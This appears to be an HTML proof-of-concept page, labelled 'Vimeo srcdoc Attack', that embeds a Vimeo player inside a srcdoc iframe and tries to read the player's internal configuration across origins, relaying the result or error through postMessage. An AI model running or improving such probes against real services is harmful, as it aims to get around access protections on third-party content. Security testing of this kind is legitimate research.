<!DOCTYPE html>
<html>
<body>
    <h1>Vimeo srcdoc Attack</h1>
    <iframe id="attack"></iframe>

    <script>
        // Try to create iframe with srcdoc that loads Vimeo
        const iframe = document.getElementById('attack');
        
        iframe.srcdoc = `
            <script>
                // Load Vimeo player
                const vimeoFrame = document.createElement('iframe');
                vimeoFrame.src = 'https://player.vimeo.com/video/935884964';
                document.body.appendChild(vimeoFrame);
                
                setTimeout(() => {
                    try {
                        // Try to access from srcdoc context
                        const config = vimeoFrame.contentWindow.playerConfig;
                        if (config) {
                            // Send to parent
                            window.parent.postMessage({
                                attack: 'srcdoc',
                                config: config
                            }, '*');
                        }
                    } catch(e) {
                        window.parent.postMessage({
                            attack: 'srcdoc',
                            error: e.message
                        }, '*');
                    }
                }, 3000);
            <\/script>
        `;

        window.addEventListener('message', (e) => {
            console.log('srcdoc result:', e.data);
        });
    </script>
</body>
</html>
